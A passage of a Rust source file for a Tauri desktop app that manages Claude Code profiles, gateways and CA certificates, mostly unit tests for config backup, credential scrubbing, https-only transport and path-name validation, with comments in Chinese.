            if let Some(window) = app.get_webview_window("main") {
                let _ = window.show();
                let _ = window.unminimize();
                let _ = window.set_focus();
            }
        }))
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            let icon = tauri::image::Image::from_bytes(include_bytes!("../icons/64x64.png"))?;
            if let Some(window) = app.get_webview_window("main") {
                window.set_icon(icon)?;
                // Windows 可能记住一个已经移出屏幕的旧位置；开发版启动必须保证窗口可见。
                let _ = window.center();
                let _ = window.unminimize();
                let _ = window.show();
                let _ = window.set_focus();
            }
            // 迁移必须排在脚本自愈之前（同 --sync 路径的理由）
            if let Some(msg) = reconcile_shared_ca() {
                sync::log_line(&msg);
            }
            // 首屏完成后，前端只调用一次异步 sync_all；所有文件扫描和旧插件迁移
            // 都在它的 blocking worker 中串行执行。setup 不再启动第二个争锁任务。
            // 同上：GUI 启动也做一次脚本自愈，两条路径谁先发生都能修好
            if let Some(msg) = refresh_scripts_if_stale(&load()) {
                sync::log_line(&msg);
            }
            mcp::start_mcp_sync_monitors(app.handle().clone());
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            list_profiles,
            save_profile,
            delete_profile,
            sync_all,
            environment,
            set_claude_executable,
            profile_runtime_info,
            extensions::resource_overview,
            extensions::import_default_resource,
            extensions::install_resource_from_path,
            extensions::set_resource_excluded,
            extensions::restore_resource_inheritance,
            extensions::delete_shared_resource,
            extensions::sync_extension_resources,
            extensions::set_resource_auto_import,
            extensions::plugin_targets,
            extensions::set_plugin_excluded,
            extensions::manage_plugin,
            extensions::install_plugin_package,
            mcp::list_mcp_services,
            mcp::register_mcp_project,
            mcp::unregister_mcp_project,
            mcp::preview_mcp_change,
            mcp::apply_mcp_change,
            mcp::test_mcp_server,
            mcp::probe_mcp_connections,
            mcp::preview_mcp_target_sync,
            mcp::apply_mcp_target_sync,
            mcp::disable_mcp_target,
            mcp::cleanup_dead_project_entries,
            backup_config,
            recent_sync_log,
            restore_shared_mcp_entry,
            plugins_overview,
            restore_plugin_inheritance,
            import_cert,
            import_cert_for,
            clear_certs,
            clear_certs_for,
            detect_models,
            detect_models_for,
            usage_stats,
            read_instance_settings,
            write_instance_settings,
            set_bypass_permissions,
            health::model_pin_warnings,
            health::fix_model_pin,
            health::health_check,
            health::startup_health_check,
            health::last_verification,
            health::export_diagnostics,
            probe_gateway,
            workbuddy::workbuddy_state,
            workbuddy::set_workbuddy_executable,
            workbuddy::save_workbuddy_gateway,
            workbuddy::save_workbuddy_organization,
            workbuddy::delete_workbuddy_organization,
            workbuddy::apply_workbuddy_organization_models,
            workbuddy::import_workbuddy_ca,
            workbuddy::list_workbuddy_models,
            workbuddy::list_workbuddy_organization_models,
            workbuddy::check_workbuddy_certificate,
            workbuddy::save_workbuddy_model,
            workbuddy::delete_workbuddy_model,
            workbuddy::test_workbuddy_model,
            workbuddy::launch_workbuddy
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn platform_ui_supplies_windows_and_macos_copy_to_frontend() {
        let windows = platform_ui("windows");
        assert!(windows.cert_path_example.contains('\\'));
        assert!(windows.shell_reload_instruction.contains("PowerShell"));

        let macos = platform_ui("macos");
        assert!(macos.cert_path_example.starts_with('/'));
        assert!(macos.shell_reload_instruction.contains("source ~/.zshrc"));
    }

    fn temp_config_paths(label: &str) -> (PathBuf, PathBuf, PathBuf) {
        let dir = std::env::temp_dir().join(format!(
            "cc-manager-{label}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&dir).unwrap();
        (dir.join("config.json"), dir.join("config.backup.json"), dir)
    }

    #[test]
    fn settings_save_rejects_file_created_after_missing_snapshot() {
        let (path, _, dir) = temp_config_paths("settings-created");
        let revision = settings_revision(None);
        fs::write(&path, r#"{"enabledPlugins":{"new":true}}"#).unwrap();
        let before = fs::read(&path).unwrap();
        assert!(save_settings_checked(&path, &serde_json::json!({}), &revision).is_err());
        assert_eq!(fs::read(&path).unwrap(), before);
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn settings_save_checks_content_and_keeps_backup() {
        let (path, _, dir) = temp_config_paths("settings-content");
        let original = r#"{"value":1}"#;
        fs::write(&path, original).unwrap();
        let revision = settings_revision(Some(original));
        fs::write(&path, r#"{"value":2}"#).unwrap();
        assert!(save_settings_checked(&path, &serde_json::json!({"value":3}), &revision).is_err());
        let current = settings_revision(Some(r#"{"value":2}"#));
        save_settings_checked(&path, &serde_json::json!({"value":3}), &current).unwrap();
        assert_eq!(
            fs::read_to_string(path.with_extension("json.bak")).unwrap(),
            r#"{"value":2}"#
        );
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn settings_missing_and_empty_are_distinct_and_new_save_succeeds() {
        assert_ne!(settings_revision(None), settings_revision(Some("")));
        let (path, _, dir) = temp_config_paths("settings-new");
        save_settings_checked(&path, &serde_json::json!({}), "missing").unwrap();
        assert_eq!(fs::read_to_string(&path).unwrap(), "{}");
        assert!(save_settings_checked(&path, &serde_json::json!({}), "missing").is_err());
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn config_save_keeps_previous_valid_version_as_backup() {
        let (primary, backup, dir) = temp_config_paths("backup");
        save_to(&primary, &backup, &[router_profile("first")]).unwrap();
        save_to(&primary, &backup, &[router_profile("second")]).unwrap();
        assert_eq!(parse_profiles(&primary).unwrap()[0].name, "second");
        assert_eq!(parse_profiles(&backup).unwrap()[0].name, "first");
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn thorough_delete_scrubs_primary_backup_and_recovery_artifacts() {
        let (primary, backup, dir) = temp_config_paths("delete-artifacts");
        let mut removed = router_profile("remove-me");
        removed.token_enc = Some("encrypted-test-value".into());
        let kept = router_profile("keep");
        let original = serde_json::json!({ "profiles": [removed.clone(), kept.clone()] });
        for path in [
            primary.clone(),
            backup.clone(),
            dir.join("config.previous.json"),
        ] {
            fs::write(path, serde_json::to_string_pretty(&original).unwrap()).unwrap();
        }
        let corrupt_with_profile = dir.join("config.corrupt.json");
        fs::write(
            &corrupt_with_profile,
            "truncated { \"name\" : \"remove-me\"",
        )
        .unwrap();
        let unrelated_corrupt = dir.join("config.corrupt.1.json");
        fs::write(&unrelated_corrupt, "truncated { \"model\": \"remove-me\"").unwrap();

        scrub_profile_from_config_artifacts_at(
            &dir,
            &primary,
            &backup,
            "remove-me",
            std::slice::from_ref(&kept),
        )
        .unwrap();

        assert!(config_artifacts_reference_profile_at(&dir, "remove-me")
            .unwrap()
            .is_empty());
        assert_eq!(parse_profiles(&primary).unwrap()[0].name, "keep");
        assert_eq!(parse_profiles(&backup).unwrap()[0].name, "keep");
        assert!(!corrupt_with_profile.exists());
        assert!(unrelated_corrupt.exists());
        assert!(config_artifact_paths_in(&dir).unwrap().iter().all(|path| {
            !fs::read_to_string(path)
                .unwrap()
                .contains("encrypted-test-value")
        }));
        fs::remove_dir_all(dir).unwrap();
    }

    /// 删除环境后，DPAPI 密文**不得残留在生成的终端脚本里**。
    ///
    /// 密文一共有三处落点：`config.json`、它的备份族、以及**内嵌密文的 cc.ps1**。
    /// 前两处已有测试（`thorough_delete_scrubs_primary_backup_and_recovery_artifacts`），
    /// 这一条补上第三处 —— 少了它，"Windows 上 `credentials::clear` 是空操作"
    /// 就只能靠推理说"别处会清掉"。
    #[test]
    fn deleted_profile_ciphertext_is_gone_from_the_generated_script() {
        let mut gone = router_profile("remove-me");
        gone.token_enc = Some("encrypted-test-value".into());
        // 对照：删除前密文**确实**在脚本里，否则下面的断言是空跑
        let before = generate_ps1(std::slice::from_ref(&gone));
        assert!(
            before.contains("encrypted-test-value"),
            "对照失败：密文本该内嵌在脚本里"
        );

        // 删除后按新列表重新生成（`delete_profile` 里的 refresh 走的就是这条路）
        let after = generate_ps1(&[router_profile("keep")]);
        assert!(
            !after.contains("encrypted-test-value"),
            "被删环境的密文仍残留在终端脚本里"
        );
        assert!(!after.contains("remove-me"));
        // 保留的环境不受影响
        assert!(after.contains("keep"));
    }

    #[test]
    fn failed_delete_can_restore_changed_and_new_files() {
        let (_, _, dir) = temp_config_paths("delete-rollback");
        let original = dir.join("original.json");
        let created = dir.join("created.json");
        fs::write(&original, "before").unwrap();
        let snapshots = vec![
            DeletionFileSnapshot {
                path: original.clone(),
                bytes: Some(b"before".to_vec()),
            },
            DeletionFileSnapshot {
                path: created.clone(),
                bytes: None,
            },
        ];
        fs::write(&original, "after").unwrap();
        fs::write(&created, "temporary").unwrap();
        restore_deletion_files(&snapshots).unwrap();
        assert_eq!(fs::read_to_string(original).unwrap(), "before");
        assert!(!created.exists());
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn thorough_delete_removes_instance_files() {
        let (_, _, dir) = temp_config_paths("delete-instance-root");
        let root = dir.join("space");
        fs::create_dir_all(root.join(".claude/projects/project-a")).unwrap();
        fs::write(root.join(".claude/history.jsonl"), "test history").unwrap();
        fs::write(
            root.join(".claude/projects/project-a/session.jsonl"),
            "test session",
        )
        .unwrap();
        purge_instance_root(&root).unwrap();
        assert!(!root.exists());
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn config_load_recovers_corrupt_primary_from_backup() {
        let (primary, backup, dir) = temp_config_paths("recover");
        fs::write(&primary, "not json").unwrap();
        let obj = serde_json::json!({ "profiles": [router_profile("safe")] });
        fs::write(&backup, serde_json::to_string_pretty(&obj).unwrap()).unwrap();
        let loaded = load_from(&primary, &backup);
        assert_eq!(loaded[0].name, "safe");
        assert_eq!(parse_profiles(&primary).unwrap()[0].name, "safe");
        assert_eq!(
            fs::read_to_string(primary.with_extension("corrupt.json")).unwrap(),
            "not json"
        );
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn config_save_replaces_corrupt_primary_without_losing_evidence() {
        let (primary, backup, dir) = temp_config_paths("replace-corrupt");
        fs::write(&primary, "truncated {").unwrap();
        save_to(&primary, &backup, &[router_profile("fresh")]).unwrap();
        assert_eq!(parse_profiles(&primary).unwrap()[0].name, "fresh");
        assert_eq!(
            fs::read_to_string(primary.with_extension("corrupt.json")).unwrap(),
            "truncated {"
        );
        assert!(parse_profiles(&backup).is_some());
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn base_url_requires_http_scheme_and_rejects_whitespace() {
        assert!(valid_base_url("https://gateway.example.com/anthropic"));
        assert!(valid_base_url("  https://gateway.example.com/anthropic/  "));
        // 远程 http 会明文发送 API Key —— 拒绝（审查 F1）
        assert!(!valid_base_url("http://gateway.example.com:8080/anthropic"));
        // 本机回环保留：流量不出网卡
        assert!(valid_base_url("http://127.0.0.1:8080/anthropic"));
        assert!(valid_base_url("http://localhost:8080/anthropic"));
        assert!(!valid_base_url("gateway.example.com"));
        assert!(!valid_base_url("https://example.com/a b"));
        assert!(!valid_base_url("file:///tmp/config"));
    }

    /// 回归：远程明文被拒时，报的必须是「明文」原因，**不能**报成「地址格式错误」。
    ///
    /// 实测缺陷：`http://203.0.113.5:8080` 是完全合法的 URL，旧实现却回
    /// 「必须是有效的 http:// 或 https:// 地址」—— 用户改格式永远改不好。
    #[test]
    fn plaintext_rejection_is_not_reported_as_a_malformed_url() {
        // 形态合法但远程明文 → 明文原因
        assert_eq!(
            base_url_rejection("http://203.0.113.5:8080"),
            Some(BaseUrlRejection::PlaintextTransport)
        );
        assert_eq!(
            base_url_rejection("http://gateway.example.com/anthropic"),
            Some(BaseUrlRejection::PlaintextTransport)
        );
        // 真的写错了 → 形态原因（两种原因必须区分开）
        assert_eq!(
            base_url_rejection("gateway.example.com"),
            Some(BaseUrlRejection::Malformed)
        );
        assert_eq!(
            base_url_rejection("https://example.com/a b"),
            Some(BaseUrlRejection::Malformed)
        );
        // 合法地址不报错
        assert_eq!(base_url_rejection("https://gw.example.com"), None);
        assert_eq!(base_url_rejection("http://127.0.0.1:8080"), None);
        assert_eq!(base_url_rejection("http://localhost:8080"), None);

        // 明文提示必须说清「为什么」与「怎么办」，否则用户仍然只知道"地址不对"
        let msg = BaseUrlRejection::PlaintextTransport.message();
        assert!(msg.contains("明文"), "应说明明文过网：{msg}");
        assert!(msg.contains("https://"), "应给出改用 https 的出路：{msg}");
        assert!(
            msg.contains("127.0.0.1") && msg.contains("localhost"),
            "应给出回环地址的出路：{msg}"
        );
    }

    /// 探测路径与保存路径必须给出**同一套**说法（同一个策略不该有两套文案）。
    #[test]
    fn probe_and_save_agree_on_the_plaintext_message() {
        assert_eq!(
            ProbeError::PlaintextTransport.message(),
            BaseUrlRejection::PlaintextTransport.message()
        );
        assert_eq!(
            ProbeError::InvalidUrl.message(),
            BaseUrlRejection::Malformed.message()
        );
        // 且两者的「明文」与「格式」文案必须互不相同（折叠回一个就等于没修）
        assert_ne!(
            ProbeError::PlaintextTransport.message(),
            ProbeError::InvalidUrl.message()
        );
    }

    // ---------------- 集成刷新的失败必须冒泡（P0-A#6） ----------------

    // ---------------- 同步结果汇报（P0-B#9） ----------------

    fn outcome(summary: &str, warnings: &[&str]) -> sync::SyncOutcome {
        sync::SyncOutcome {
            summary: summary.into(),
            warnings: warnings.iter().map(|w| w.to_string()).collect(),
        }
    }

    #[test]
    fn sync_report_never_drops_a_warning() {
        // 回归：warnings 原先被 sync_configs 丢掉，界面只说"写了 N 份"，
        // 用户看不到"哪个域被跳过 / 哪次写失败" —— 那恰恰是最该看见的。
        let report = compose_sync_report(
            "已接入：zsh",
            &outcome(
                "mcpServers 3 项/写回 2 份",
                &["mcpServers：ds 写失败", "mcpServers：跳过 a"],
            ),
            &["a".into(), "ds".into()],
        );
        assert!(report.contains("mcpServers：ds 写失败"), "{report}");
        assert!(report.contains("mcpServers：跳过 a"), "{report}");
        assert!(report.contains("警告 2 条"), "{report}");
        // 影响范围要说清影响了谁，不能只说"完成"；
        // 并且必须写明默认 Claude **不参与** —— 决策 7.2 之后它已退出这条链，
        // 旧文案「默认 Claude + N 个环境」是不实陈述。
        assert!(report.contains("应用共享库 → 2 个环境"), "{report}");
        assert!(report.contains("默认 Claude 不参与"), "{report}");
        assert!(report.contains("a、ds"), "{report}");
    }

    #[test]
    fn sync_report_states_absence_of_warnings_explicitly() {
        // "无警告"要写出来：留空会让人分不清"没有警告"和"警告没显示出来"
        let report = compose_sync_report("已接入：zsh", &outcome("mcpServers 0 项", &[]), &[]);
        assert!(report.contains("无警告。"), "{report}");
        // 没有环境时不能写成"影响了默认 Claude" —— 一个都没影响
        assert!(report.contains("没有受管理环境"), "{report}");
    }

    #[test]
    fn gui_startup_has_one_async_sync_path_without_a_setup_lock_race() {
        let source = include_str!("main.rs");
        let start = source.find(".setup(|app|").unwrap();
        let end = source[start..]
            .find(".invoke_handler")
            .map(|offset| start + offset)
            .unwrap();
        let setup = &source[start..end];
        assert!(!setup.contains("extensions::sync_all_locked"));
        assert!(!setup.contains("migrate_legacy_plugins_blocking"));

        let sync_start = source.find("async fn sync_all()").unwrap();
        let sync_body: String = source[sync_start..].chars().take(500).collect();
        assert!(sync_body.contains("spawn_blocking(sync_all_blocking)"));
    }

    #[test]
    fn profile_mutations_hold_the_config_lock() {
        // 回归（审查 F1）：save_profile / delete_profile 的"读 → 改 → 写"原先**没有持锁**，
        // 与 claude --sync 并发时会用陈旧 list 覆盖对方的改动（丢更新）；
        // delete_profile 的失败回滚同理需要在同一把锁内完成。
        let source = include_str!("main.rs");
        for name in ["fn save_profile", "fn delete_profile"] {
            let start = source.find(name).unwrap_or_else(|| panic!("找不到 {name}"));
            // 函数体开头一段就应当取锁。
            // **按字符切，不按字节** —— 源码里有中文，字节切片会切在字符中间直接 panic。
            let head: String = source[start..].chars().take(900).collect();
            assert!(
                head.contains("acquire_config_lock"),
                "{name} 没有在入口处持配置锁"
            );
        }
        // 删除路径必须走非重入内部函数，否则会自己把自己锁住
        assert!(source.contains("forget_profile_locked"));
    }

    #[test]
    fn saving_an_environment_immediately_distributes_shared_mcp() {
        let source = include_str!("main.rs");
        let start = source.find("fn save_profile").unwrap();
        let end = source[start..]
            .find("struct DeletionFileSnapshot")
            .map(|offset| start + offset)
            .unwrap();
        let body = &source[start..end];
        assert!(body.contains("sync::sync_configs_locked(&names)"));
        assert!(body.contains("compose_sync_report"));
    }

    #[test]
    fn gui_sync_records_success_and_failure_in_the_diagnostic_log() {
        let source = include_str!("main.rs");
        let start = source.find("fn sync_all_blocking").unwrap();
        let body: String = source[start..].chars().take(1800).collect();
        assert!(body.contains("GUI 同步并修复:{report}"));
        assert!(body.contains("GUI 同步并修复失败:{error}"));
    }

    #[test]
    fn gui_startup_sync_never_reads_gateway_credentials() {
        // macOS 钥匙串会把“始终允许”绑定到应用的签名身份。开发版重新编译、
        // 正式版签名变化或升级后，任何启动期读取都可能再次弹系统授权框。
        // 启动同步只负责配置与扩展分发；读取 Key、探测网关只能由用户主动操作触发。
        let source = include_str!("main.rs");
        let start = source.find("fn sync_all_blocking").unwrap();
        let end = source[start..]
            .find("async fn sync_all(")
            .map(|offset| start + offset)
            .unwrap();
        let body = &source[start..end];
        for forbidden in ["decrypt_token", "credentials::read", "run_health_checks"] {
            assert!(
                !body.contains(forbidden),
                "启动同步不应调用 {forbidden}，否则 macOS 启动时可能反复弹钥匙串授权框"
            );
        }
    }

    #[test]
    fn plaintext_transport_only_allowed_on_loopback() {
        // https 一律放行
        for secure in ["https://gw.example.com", "https://203.0.113.10:8443"] {
            assert!(transport_is_loopback_or_secure(secure), "{secure} 应放行");
        }
        // http 只放行 loopback：这些流量不出网卡，没有中间人面
        for loopback in [
            "http://localhost:8080",
            "http://LocalHost:8080", // 大小写不敏感
            "http://127.0.0.1",
            "http://127.0.0.5:1", // 整个 127/8 都算回环
            "http://[::1]:8080",
        ] {
            assert!(
                transport_is_loopback_or_secure(loopback),
                "{loopback} 应放行"
            );
        }
        // 远程 http 一律拒绝 —— Key 会明文过网
        for remote in [
            "http://gw.example.com",
            "http://203.0.113.10:8080",
            "http://198.51.100.7",
        ] {
            assert!(!transport_is_loopback_or_secure(remote), "{remote} 应拒绝");
        }
        // 非 http(s) 与非 URL 都拒绝
        for other in [
            "ftp://gw.example.com",
            "ws://gw.example.com",
            "not a url",
            "",
        ] {
            assert!(!transport_is_loopback_or_secure(other), "{other} 应拒绝");
        }
    }

    #[test]
    fn shell_config_fold_distinguishes_all_from_partial_failure() {
        // 单文件 shell（zsh、或某个 PowerShell 的 $PROFILE）
        assert_eq!(fold_shell_config_results(1, vec![]), ShellConfigOutcome::Ok);
        assert_eq!(
            fold_shell_config_results(1, vec!["~/.zshrc（拒绝访问）".into()]),
            ShellConfigOutcome::Failed("~/.zshrc（拒绝访问）".into())
        );
        // 双文件 shell（bash 的 .bash_profile + .bashrc）：只挂一个仍能加载
        assert_eq!(
            fold_shell_config_results(2, vec!["~/.bashrc（拒绝访问）".into()]),
            ShellConfigOutcome::Partial("~/.bashrc（拒绝访问）".into())
        );
        // 两个文件都挂 —— 该终端不会加载集成脚本，必须报错，不能报成功
        match fold_shell_config_results(
            2,
            vec!["~/.bash_profile（a）".into(), "~/.bashrc（b）".into()],
        ) {
            ShellConfigOutcome::Failed(joined) => {
                assert!(
                    joined.contains(".bash_profile") && joined.contains(".bashrc"),
                    "{joined}"
                );
            }
            other => panic!("两个配置文件都写失败必须判 Failed，实际：{other:?}"),
        }
    }

    #[test]
    fn shell_target_labels_are_unique() {
        // 健康项的 id 由 label 拼出来，重名会让两项互相覆盖
        let all = [
            ShellTarget::WindowsPowershell,
            ShellTarget::Powershell7,
            ShellTarget::Zsh,
            ShellTarget::Bash,
        ];
        let labels: Vec<&str> = all.iter().map(|t| t.label()).collect();
        let unique: std::collections::HashSet<&&str> = labels.iter().collect();
        assert_eq!(unique.len(), labels.len(), "shell 标签必须唯一：{labels:?}");
    }

    #[test]
    fn bash_covers_both_login_and_interactive_profiles() {
        // 回归：原先只写 ~/.bashrc。但交互式**登录** bash 读的是 ~/.bash_profile，
        // 所以 Terminal.app 里的登录 shell 根本加载不到集成 —— 却会被报成"已接入"。
        let paths = shell_config_paths(ShellTarget::Bash).unwrap();
        let names: Vec<String> = paths
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().to_string())
            .collect();
        assert!(names.contains(&".bash_profile".to_string()), "{names:?}");
        assert!(names.contains(&".bashrc".to_string()), "{names:?}");
    }

    #[test]
    fn powershell_51_and_7_are_distinct_targets() {
        // Windows 上 5.1 与 7 的 $PROFILE 是两个不同文件，必须当成两个目标分别接入与报告，
        // 否则就是 B#11：只接入了 5.1，用 pwsh 7 的人被谎报"已接入"。
        assert_eq!(
            ShellTarget::WindowsPowershell.label(),
            "Windows PowerShell 5.1"
        );
        assert_eq!(ShellTarget::Powershell7.label(), "PowerShell 7+");
        assert_ne!(ShellTarget::WindowsPowershell, ShellTarget::Powershell7);
    }

    #[test]
    fn integration_refresh_errors_are_never_swallowed_again() {
        // 回归护栏。原缺陷：import_cert / clear_certs 用 `let _ =` 吞掉 install_integration
        // 的返回值，于是「证书导入了但终端集成没刷新」也报成功 —— 证书实际不生效，
        // 用户以为好了却连不上网关。这里直接扫源码，防止那种写法被写回来。
        //
        // needle 在运行时拼出来：否则这个测试文件自己就含那串字面量，永远命中自己。
        let source = include_str!("main.rs");
        let needle = format!("let _ = {}", "install_integration");
        assert!(
            !source.contains(&needle),
            "install_integration 的错误又被吞掉了：CA 导入/清空会重新变成\"报成功但不生效\""
        );
    }

    #[test]
    fn config_load_normalizes_manually_edited_base_url() {
        let (primary, backup, dir) = temp_config_paths("normalize-url");
        let mut profile = router_profile("manual");
        profile.base_url = "  https://gateway.example.com/anthropic/  ".into();
        let obj = serde_json::json!({ "profiles": [profile] });
        fs::write(&primary, serde_json::to_string_pretty(&obj).unwrap()).unwrap();
        let loaded = load_from(&primary, &backup);
        assert_eq!(loaded[0].base_url, "https://gateway.example.com/anthropic");
        fs::remove_dir_all(dir).unwrap();
    }

    fn router_profile(name: &str) -> Profile {
        Profile {
            name: name.to_string(),
            type_: "router".to_string(),
            base_url: "https://gw.example.com/anthropic".to_string(),
            token_enc: None,
            has_token: true,
            opus_model: "opus-x".to_string(),
            sonnet_model: "sonnet-x".to_string(),
            haiku_model: "haiku-x".to_string(),
        }
    }

    fn account_profile(name: &str) -> Profile {
        Profile {
            name: name.to_string(),
            type_: "account".to_string(),
            ..Default::default()
        }
    }

    // ---- CA 逐网关隔离（审查第 3 条）----

    #[test]
    fn ca_migration_is_incremental_and_never_misses_a_late_addition() {
        // 回归：标记原先是个布尔值（"做过一次"），于是用户在**旧版**里再导入一张证书
        // 之后就**永远漏掉**它 —— 那个网关联不上自签网关，而报错现场是 TLS，离原因很远。
        // 现在标记存的是**已迁移证书的指纹集合**，每次启动补齐差额。
        let a = "-----BEGIN CERTIFICATE-----\nAAA\n-----END CERTIFICATE-----".to_string();
        let b = "-----BEGIN CERTIFICATE-----\nBBB\n-----END CERTIFICATE-----".to_string();

        // 首次：两张都该补发
        let both = vec![a.clone(), b.clone()];
        assert_eq!(certs_pending_migration(&both, &[]).len(), 2);

        // 迁移后记账
        let migrated: Vec<String> = both.iter().map(|c| cert_fingerprint(c)).collect();
        assert!(certs_pending_migration(&both, &migrated).is_empty());

        // **旧版期间又导入一张** → 只补这一张，老的不重复搬
        let c = "-----BEGIN CERTIFICATE-----\nCCC\n-----END CERTIFICATE-----".to_string();
        let three = vec![a.clone(), b.clone(), c.clone()];
        let pending = certs_pending_migration(&three, &migrated);
        assert_eq!(pending.len(), 1, "新导入的那张必须被识别出来");
        assert_eq!(norm_pem(pending[0]), norm_pem(&c));

        // 指纹必须无视换行/缩进差异（同一张证书在不同文件里写法可能不同）
        let a_pretty = "-----BEGIN CERTIFICATE-----\r\n   AAA   \r\n-----END CERTIFICATE-----";
        assert_eq!(cert_fingerprint(&a), cert_fingerprint(a_pretty));
        assert!(
            certs_pending_migration(&[a_pretty.to_string()], &migrated).is_empty(),
            "同一张证书的另一种写法不该被当成新证书"
        );
    }

    #[test]
    fn ca_bundle_names_reject_path_characters() {
        assert_eq!(ca_bundle_file("corp").as_deref(), Some("corp.pem"));
        // 老规则时代的合法名字（中文/点号）继续放行
        assert_eq!(ca_bundle_file("我的环境").as_deref(), Some("我的环境.pem"));
        assert_eq!(ca_bundle_file("gw.corp").as_deref(), Some("gw.corp.pem"));
        // 会跑出目录或跨盘的名字一律拒绝
        for bad in ["", ".", "..", "a/b", "a\\b", "C:corp", "a\nb"] {
            assert!(ca_bundle_file(bad).is_none(), "{bad} 应被拒绝");
        }
    }

    #[test]
    fn pem_comparison_ignores_whitespace_but_keeps_writable_blocks() {
        let a = "-----BEGIN CERTIFICATE-----\nAAA\n-----END CERTIFICATE-----";
        let b = "-----BEGIN CERTIFICATE-----\r\n   AAA   \r\n-----END CERTIFICATE-----";
        assert_eq!(norm_pem(a), norm_pem(b));
        assert!(
            has_block(&[b.to_string()], a),
            "换行/缩进不同应判为同一张证书"
        );
        // 关键：返回的必须是**原文块** —— 早先的实现把空白全去掉，
        // 连 `BEGIN CERTIFICATE` 里的空格都没了，写回文件就不是合法 PEM 了
        let blocks = pem_blocks(a);
        assert_eq!(blocks.len(), 1);
        assert!(
            blocks[0].contains("-----BEGIN CERTIFICATE-----"),
            "标记里的空格被吃掉了：{:?}",
            blocks[0]
        );
    }

    #[test]
    fn a_cert_still_used_by_another_gateway_is_never_revoked() {
        // 本项最容易做错的地方：从网关 A 删掉的证书可能仍被 B 需要。
        // 无条件撤销会让 B 连不上，而用户完全看不出原因（文件还在、系统信任没了）。
        let shared = "-----BEGIN CERTIFICATE-----\nSHARED\n-----END CERTIFICATE-----";
        let only_a = "-----BEGIN CERTIFICATE-----\nONLY-A\n-----END CERTIFICATE-----";
        let removed = vec![shared.to_string(), only_a.to_string()];
        let remaining = vec![shared.to_string()]; // B 仍信任 shared

        let revoke = certs_to_revoke(&removed, &remaining);

        assert_eq!(revoke.len(), 1, "只该撤销 A 独有的那张：{revoke:?}");
        assert_eq!(norm_pem(&revoke[0]), norm_pem(only_a));
        // 没有别的网关在用 → 全部可撤销
        assert_eq!(certs_to_revoke(&removed, &[]).len(), 2);
        // 别的网关全都在用 → 一张都不撤销
        assert!(certs_to_revoke(&removed, &removed).is_empty());
    }

    // —— 偏差 6：用量统计只扫「默认 Claude + 配置里登记的环境」——（纯函数，平台无关）

    #[test]
    fn usage_scan_is_driven_by_config_not_by_disk() {
        // 核心回归：磁盘上残留、配置里已经没有的环境目录，不得再被统计。
        // 原先按 `read_dir(~/.claude-split)` 枚举，删掉的环境只要目录还在就会一直显示。
        let list = vec![router_profile("corp"), account_profile("test")];
        let scanned = usage_profiles_to_scan(&list);
        assert_eq!(scanned, vec!["__main__", "corp", "test"]);
        // 注意本函数**没有任何磁盘输入** —— 只看配置，这正是修复点；
        // 想造"已删除但目录还在"的场景，在旧实现下会漏，在这里天然成立。
    }

    #[test]
    fn usage_scan_always_includes_default_claude_first() {
        // 默认 Claude 是统计基准：一个环境都没有时也必须扫它
        assert_eq!(usage_profiles_to_scan(&[]), vec!["__main__"]);
    }

    #[test]
    fn usage_scan_skips_names_that_cannot_be_joined_into_a_path() {
        // 配置被手工改坏时，不能让 `..`/分隔符把扫描带出 ~/.claude-split
        for bad in ["", ".", "..", "a/b", "a\\b", "a\nb"] {
            assert!(!safe_usage_dir_name(bad), "{bad} 应被拒绝");
        }
        // 老规则时代的中文/带点号名字继续放行；空格对"拼路径"无害，不在这里拦
        // （它另有后果：script_safe_name 会让它拿不到终端入口，那是别处的告警）
        assert!(safe_usage_dir_name("我的环境"));
        assert!(safe_usage_dir_name("gw.corp"));
        assert!(safe_usage_dir_name("my env"));

        let list = vec![
            account_profile(".."),
            account_profile("a/b"),
            account_profile("ok"),
        ];
        assert_eq!(
            usage_profiles_to_scan(&list),
            vec!["__main__", "ok"],
            "越界名字必须被剔除"
        );
    }

    #[test]
    fn usage_scan_never_folds_a_leftover_main_dir_into_default_claude() {
        // 历史遗留的 `~/.claude-split/__main__` 目录若被当成一个环境，
        // 会把它的数据混进默认 Claude 的统计里。配置里真出现这个键也必须挡住。
        let list = vec![account_profile("__main__"), account_profile("corp")];
        assert_eq!(
            usage_profiles_to_scan(&list),
            vec!["__main__", "corp"],
            "不能出现两个 __main__"
        );
    }

    #[test]
    fn usage_scan_does_not_enumerate_the_disk_any_more() {
        // 上面几条纯函数测试**挡不住**"调用方又改回枚举磁盘目录"这种回归 ——
        // 它们只验证 `usage_profiles_to_scan` 本身。所以按源码结构再钉一道。
        let src = include_str!("main.rs");
        let body = src
            .split("fn collect_usage_stats")
            .nth(1)
            .and_then(|rest| rest.split("\n#[tauri::command]").next())
            .unwrap_or("");
        assert!(
            body.len() > 200,
            "没切到 collect_usage_stats 函数体：{body}"
        );
        assert!(
            body.contains("usage_profiles_to_scan"),
            "扫哪些副本必须由配置驱动：{body}"
        );
        // 运行时拼接 needle，避免本测试自己的字符串命中自己
        let needle = format!("read_{}", "dir");
        assert!(
            !body.contains(&needle),
            "用量统计又回到按磁盘目录枚举了 —— 已删除的环境会重新出现在面板上：{body}"
        );
    }

    // —— 用量统计：message.id 去重回归测试（平台无关，任一开发机均可跑）——

    fn write_usage_fixture(lines: &[serde_json::Value]) -> (PathBuf, PathBuf) {
        // 测试会并行创建多个 fixture；仅靠时钟在 Windows/macOS 的低分辨率时钟上
        // 可能同名并互相覆盖，导致用量行数偶发变少。
        let dir =
            std::env::temp_dir().join(format!("cc-manager-usage-{}", crate::sync::unique_token()));
        fs::create_dir_all(&dir).unwrap();
        let f = dir.join("session.jsonl");
        let body = lines
            .iter()
